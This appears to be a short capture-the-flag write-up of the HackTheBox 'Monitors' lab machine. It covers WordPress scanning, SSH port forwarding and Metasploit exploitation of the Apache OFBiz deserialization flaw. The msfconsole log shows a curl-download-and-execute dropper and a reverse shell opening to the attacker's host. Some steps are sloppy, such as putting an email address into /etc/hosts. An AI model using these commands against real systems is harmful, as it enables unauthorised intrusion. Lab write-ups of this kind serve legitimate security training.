## User

opening `10.10.10.238` says :

```Sorry, direct IP access is not allowed.
If you are having issues accessing the site then contact the website administrator: admin@monitors.htb
```

So add `admin@monitors.htb` to your `/etc/hosts` file.

Once updated open monitors.htb

using wappalyzer you can see its a wordpress website, so we scan it via `wpscan`  

it was a pain to get the keys and register but once done i was able to see the vulnerabilities and exploits as mentioned in this [file](wpscan.log)

## Root

Use linpeas.sh with `marcus` user.

didnt find anything so check all available ports
`netstat -tulnp` and find port 8443 so i port forward it to my own machine using:

`ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238 `

then i found this after researching
https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data
https://kalinull.medium.com/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d

it shows a msf module imported it using this guide
https://kalinull.medium.com/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d


```bash
echo "msfconsole output"
msf6 > searchsploit Apache OFBiz
[*] exec: searchsploit Apache OFBiz

------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache OFBiz - Admin Creator                                                                                                                                | multiple/remote/12264.txt
Apache OFBiz - Multiple Cross-Site Scripting Vulnerabilities                                                                                                | php/webapps/12330.txt
Apache OFBiz - Remote Execution (via SQL Execution)                                                                                                         | multiple/remote/12263.txt
Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities                                                                                         | multiple/remote/38230.txt
Apache OFBiz 16.11.04 - XML External Entity Injection                                                                                                       | java/webapps/45673.py
Apache OFBiz 16.11.05 - Cross-Site Scripting                                                                                                                | multiple/webapps/45975.txt
Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)                                                                                       | java/webapps/48408.txt
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments                                                        | java/webapps/50178.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
msf6 > use e
Display all 2218 possibilities? (y or n)
msf6 > use exploit/linux/
Display all 353 possibilities? (y or n)
msf6 > use exploit/linux/http/apache_ofbiz_deserialization
[*] Using configured payload linux/x64/meterpreter_reverse_https
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/http/apache_ofbiz_deserialization) >  set lhost 10.10.16.11
lhost => 10.10.16.11
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lport 9001
lport => 9001
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
forceexploit => true
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set payload linux/x64/shell/reverse_tcp 
payload => linux/x64/shell/reverse_tcp
msf6 exploit(linux/http/apache_ofbiz_deserialization) > run

[*] Started reverse TCP handler on 10.10.16.11:9001 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. Target cannot deserialize arbitrary data. ForceExploit is enabled, proceeding with exploitation.
[*] Executing Linux Dropper for linux/x64/shell/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/Vu5gCY9zU3w4Qx3
[*] Local IP: http://192.168.1.115:8080/Vu5gCY9zU3w4Qx3
[+] Successfully executed command: curl -so /tmp/rGjfEHFX http://10.10.16.11:8080/Vu5gCY9zU3w4Qx3;chmod +x /tmp/rGjfEHFX;/tmp/rGjfEHFX;rm -f /tmp/rGjfEHFX
[*] Command Stager progress - 100.00% done (119/119 bytes)
[*] Client 10.10.10.238 (curl/7.64.0) requested /Vu5gCY9zU3w4Qx3
[*] Sending payload to 10.10.10.238 (curl/7.64.0)
[*] Sending stage (38 bytes) to 10.10.10.238
[*] Command shell session 1 opened (10.10.16.11:9001 -> 10.10.10.238:52582) at 2021-10-03 20:30:13 -0400
[*] Server stopped.

```

https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
